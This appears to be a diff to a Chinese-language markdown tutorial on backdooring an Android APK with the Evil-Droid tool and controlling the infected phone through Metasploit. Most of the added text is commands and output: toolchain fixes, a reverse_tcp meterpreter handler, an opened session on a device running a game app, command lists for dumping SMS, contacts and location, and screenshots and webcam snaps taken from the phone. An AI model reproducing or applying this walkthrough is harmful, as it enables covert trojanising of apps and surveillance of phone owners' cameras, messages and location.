@@ -167,5 +167,394 @@ changelog  evil-droid  icons  README.md  tools
 选要植入后门的apk
 
 然后等它自动逆向
+签名随便填
+
+有可能的问题
+┌──(root💀tyza66)-[~]
+└─# update-alternatives --config java
+有 2 个候选项可用于替换 java (提供 /usr/bin/java)。
+
+  选择       路径                                       优先级  状态
+------------------------------------------------------------
+* 0            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      自动模式
+  1            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      手动模式
+  2            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      手动模式
+
+要维持当前值[*]请按<回车键>，或者键入选择的编号：1
+update-alternatives: 使用 /usr/lib/jvm/java-17-openjdk-amd64/bin/java 来在手动模式中提供 /usr/bin/java (java)
+
+┌──(root💀tyza66)-[~/Evil-Droid-master]
+└─# apt-get remove zipalign
+正在读取软件包列表... 完成
+正在分析软件包的依赖关系树... 完成
+正在读取状态信息... 完成                 
+下列软件包是自动安装的并且现在不需要了：
+  cpp-13 ibverbs-providers libboost-iostreams1.83.0 libboost-thread1.83.0
+  libcephfs2 libgfapi0 libgfrpc0 libgfxdr0 libglusterfs0 libibverbs1
+  libpython3.11-dev librados2 librdmacm1t64 libzopfli1 python3-lib2to3
+  python3.11 python3.11-dev python3.11-minimal samba-vfs-modules
+使用'apt autoremove'来卸载它(它们)。
+下列软件包将被【卸载】：
+  zipalign
+升级了 0 个软件包，新安装了 0 个软件包，要卸载 1 个软件包，有 1901 个软件包未被升级。
+解压缩后将会空出 77.8 kB 的空间。
+您希望继续执行吗？ [Y/n] y
+(正在读取数据库 ... 系统当前共安装有 419929 个文件和目录。)
+正在卸载 zipalign (1:10.0.0+r36-1) ...
+正在处理用于 man-db (2.12.1-1) 的触发器 ...
+正在处理用于 kali-menu (2023.4.7) 的触发器 ...
+                                                                              
+┌──(root💀tyza66)-[~/Evil-Droid-master]
+└─# vim /etc/apt/sources.list
+                                                                              
+┌──(root💀tyza66)-[~/Evil-Droid-master]
+└─#  apt-get update && apt-get install zipalign
+
+kali自带的这个组件好像有问题 重新安装一下
+
+┌──(root💀tyza66)-[~/Evil-Droid-master]
+└─# apt install openjdk-11-jdk-headless -y
+下列软件包是自动安装的并且现在不需要了：       
+  cpp-13                   libgfrpc0         librdmacm1t64
+  ibverbs-providers        libgfxdr0         python3-lib2to3
+  libboost-iostreams1.83.0 libglusterfs0     python3.11
+  libboost-thread1.83.0    libibverbs1       python3.11-dev
+  libcephfs2               libpython3.11-dev python3.11-minimal
+  libgfapi0                librados2         samba-vfs-modules
+使用'apt autoremove'来卸载它(它们)。
+
+将要安装：
+  openjdk-11-jdk-headless
+                                                                              
+将要安装的依赖：
+  openjdk-11-jre-headless
+
+apktool 2.4.1
+自己修复一些bug
+
+自带的不怎么好看
+咱们自己启动一个监听
+┌──(root💀tyza66)-[~/Evil-Droid-master]
+└─# msfdb run              
+[+] Starting database
+Metasploit tip: Set the current module's RHOSTS with database values using 
+hosts -R or services -R
+                                                  
+
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+                                                                             
+                                                                    .        
+                .                                                            
+        o                  To boldly go where no                             
+                            shell has gone before                            
+                                                                             
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 >  use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+PAYLOAD => android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 192.168.101.53
+lhost => 192.168.101.53
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] Sending stage (71398 bytes) to 192.168.101.93
+[*] Meterpreter session 1 opened (192.168.101.53:4444 -> 192.168.101.93:46472) at 2025-02-17 21:32:08 +0800
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background
+                               thread
+    channel                   Displays information or control active channe
+                              ls
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/http
+                              s)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current
+                               session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the
+                               session
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the se
+                              ssion
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establ
+                              ish session
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias for lpwd
+                              )
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to the scre
+                              en
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    portfwd                   Forward a local port to a remote service
+    route                     View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    execute                   Execute a command
+    getenv                    Get one or more environment variable values
+    getpid                    Get the current process identifier
+    getuid                    Get the user that the server is running as
+    localtime                 Displays the target system local date and tim
+                              e
+    pgrep                     Filter processes by name
+    ps                        List running processes
+    shell                     Drop into a system command shell
+    sysinfo                   Gets information about the remote system, suc
+                              h as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command                   Description
+    -------                   -----------
+    screenshare               Watch the remote user desktop in real time
+    screenshot                Grab a screenshot of the interactive desktop
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    record_mic                Record audio from the default microphone for
+                              X seconds
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the specified webcam
+    webcam_stream             Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on the targ
+                              et system
+
+
+Android Commands
+================
+
+    Command                   Description
+    -------                   -----------
+    activity_start            Start an Android activity from a Uri string
+    check_root                Check if device is rooted
+    dump_calllog              Get call log
+    dump_contacts             Get contacts list
+    dump_sms                  Get sms messages
+    geolocate                 Get current lat-long using geolocation
+    hide_app_icon             Hide the app icon from the launcher
+    interval_collect          Manage interval collection capabilities
+    send_sms                  Sends SMS from target session
+    set_audio_mode            Set Ringer Mode
+    sqlite_query              Query a SQLite database from storage
+    wakelock                  Enable/Disable Wakelock
+    wlan_geolocate            Get current lat-long using WLAN information
+
+
+Application Controller Commands
+===============================
+
+    Command                   Description
+    -------                   -----------
+    app_install               Request to install apk file
+    app_list                  List installed apps in the device
+    app_run                   Start Main Activity for package name
+    app_uninstall             Request to uninstall application
+
+For more info on a specific command, use <command> -h or help <command>.
+
+meterpreter > screenshare
+[*] Preparing player...
+[*] Opening player at: /root/Evil-Droid-master/lpLrAzAw.html
+[*] Streaming...
+^C[-] screenshare: Interrupted
+meterpreter > screenshoot
+[-] Unknown command: screenshoot. Did you mean screenshot? Run the help command for more details.
+meterpreter > screenshot
+Screenshot saved to: /root/Evil-Droid-master/gHLYGLIx.jpeg
+meterpreter > getuid
+Server username: u0_a420
+meterpreter > pwd
+/data/user/0/com.sxiaoao.moto3dOnline/files
+
+常用命令解释
+Stdapi: Webcam Commands
+===================================
+webcam_list 列出网络摄像头
+record_mic [ˈrekərd]/记录/ 从默认麦克风录制音频为 X 秒
+webcam_chat 开始视频聊天
+webcam_snap 从指定的摄像头获取快照
+webcam_stream -i 1 从指定的网络摄像头播放视频流[选择后摄像头]
+Android Commands
+=================
+activity_start 从 URI 字符串启动 Android 活动
+check_root 检查设备是否有根
+dump_calllog 获取调用日志
+dump_contacts 获取联系人列表
+dump_sms 获取短信
+geolocate 利用地理定位获取当前 LAT
+wlan_geolocate 利用 WLAN 信息获取当前 LAT
+hide_app_icon 从发射器隐藏应用程序图标
+interval_collect 管理区间收集能力
+send_sms 从目标会话发送短消息
+set_audio_mode
+sqlite_query 从存储库查询 SQLite 数据库
+wakelock 启用/禁用 Wakelock
+meterpreter > cd /
+meterpreter > ls
+
+meterpreter > ls
+Listing: /data/user/0/com.sxiaoao.moto3dOnline/files
+====================================================
+
+Mode           Size  Type  Last modified            Name
+----           ----  ----  -------------            ----
+040776/rwxrwx  3452  dir   2025-02-17 21:41:37 +08  oat
+rw-                        00
+100666/rw-rw-  0     fil   2025-02-17 21:41:17 +08  plugin_v3_MzOfflinePlug
+rw-                        00                       in-10-10-2001000.jar.lo
+                                                    ck
+040776/rwxrwx  3452  dir   2025-02-17 21:32:05 +08  plugins_v3_data
+rw-                        00
+
+meterpreter > pwd
+/data/user/0/com.sxiaoao.moto3dOnline/files
+meterpreter > cd /
+meterpreter > ls
+[-] stdapi_fs_ls: Operation failed: 1
+meterpreter > ls
+[-] stdapi_fs_ls: Operation failed: 1
+meterpreter > ls
+[-] stdapi_fs_ls: Operation failed: 1
+meterpreter > cd /data
+meterpreter > ls
+[-] stdapi_fs_ls: Operation failed: 1
+meterpreter > cd /data/user/0/com.sxiaoao.moto3dOnline/files
+meterpreter > ls
+Listing: /data/user/0/com.sxiaoao.moto3dOnline/files
+====================================================
+
+Mode           Size  Type  Last modified            Name
+----           ----  ----  -------------            ----
+040776/rwxrwx  3452  dir   2025-02-17 21:41:37 +08  oat
+rw-                        00
+100666/rw-rw-  0     fil   2025-02-17 21:41:17 +08  plugin_v3_MzOfflinePlug
+rw-                        00                       in-10-10-2001000.jar.lo
+                                                    ck
+040776/rwxrwx  3452  dir   2025-02-17 21:32:05 +08  plugins_v3_data
+rw-                        00
+
+meterpreter > webcam_list
+1: Back Camera
+2: Front Camera
+meterpreter > webcam_snap -i 1
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/Evil-Droid-master/azTFzryU.jpeg
+meterpreter > webcam_snap -i 2
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/Evil-Droid-master/QNhPmNmB.jpeg
+meterpreter > 
+
+
+
 
                                                                            
